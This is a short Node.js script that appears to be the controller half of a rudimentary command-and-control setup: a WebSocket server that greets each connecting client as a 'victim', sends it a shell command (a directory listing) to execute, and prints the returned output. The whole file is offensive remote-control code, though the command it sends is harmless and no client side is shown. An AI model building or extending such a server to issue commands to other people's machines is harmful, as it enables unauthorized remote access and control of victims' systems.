#!/usr/bin/env node
const http = require("http");
const { server: WebSocketServer } = require("websocket");

const PORT = process.env.PORT || 8080;

const server = http.createServer((request, response) => {
  console.log(new Date() + " Received request for " + request.url);
  response.writeHead(404);
  response.end();
});
server.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});

const wsServer = new WebSocketServer({
  httpServer: server,
  autoAcceptConnections: false
});

wsServer.on("request", request => {
  const connection = request.accept("echo-protocol", request.origin);
  console.log(`New victim connected at address: ${request.remoteAddresses}`);

  connection.sendUTF(JSON.stringify(["ls", ["-lah"]]));

  connection.on("message", message => {
    if (message.type !== "utf8") {
      return;
    }
    console.log(JSON.parse(message.utf8Data));

    connection.close();
  });

  //   connection.on("close", () => {
  //     console.log(new Date() + " Peer " + connection.remoteAddress + " disconnected.");
  //   });
});
